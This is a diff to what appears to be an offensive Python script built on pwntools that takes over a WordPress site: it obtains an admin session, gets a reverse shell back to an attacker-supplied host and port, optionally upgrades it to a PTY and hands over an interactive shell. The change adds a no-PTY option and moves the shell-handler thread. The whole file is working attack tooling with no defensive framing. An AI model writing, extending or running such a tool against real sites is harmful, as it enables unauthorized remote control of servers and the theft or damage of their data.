@@ -35,6 +35,7 @@ def main(args: Namespace):
     password = args.password
     lhost = args.lhost
     lport = args.lport
+    no_pty = args.no_pty
 
     with log.progress('Trying to get an admin session...') as p:
         login_service = LoginService(wp_url)
@@ -56,25 +57,26 @@ def main(args: Namespace):
         shell.recvline_contains(b'$', timeout=0.5) # Check shell came back
         p.success('Got a shell!')
     
-    with log.progress('Trying to stabilize the shell...') as p:
-        try:
-            shell_service.upgrade_shell(shell)
-            terminal_service.pty = True
-            p.success('Shell stabilized!')
-        except:
-            p.failure('Shell stabilization not possible, a non pty shell will be provided')
-        finally:
-            # Start shell checker to control the closing
-            shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
-            shell_handler_thread.setDaemon(True)
-            shell_handler_thread.start()
+    if(not no_pty):
+        with log.progress('Trying to stabilize the shell...') as p:
+            try:
+                shell_service.upgrade_shell(shell)
+                terminal_service.pty = True
+                p.success('Shell stabilized!')
+            except:
+                p.failure('Shell stabilization not possible, a non pty shell will be provided')
+                
+    # Start shell handler to control the closing
+    shell_handler_thread = threading.Thread(target=shell_handler, args=(shell,))
+    shell_handler_thread.setDaemon(True)
+    shell_handler_thread.start()
     
     # Start interactive mode
     log.info('Switching to interactive mode')
     log.setLevel('error')
     if(terminal_service.pty):
         terminal_service.set_raw_mode()
-    shell.sendline(b'') # Make the prompt appear
+        shell.sendline(b'') # Make the prompt appear
     shell.interactive()
 
 if __name__ == '__main__':
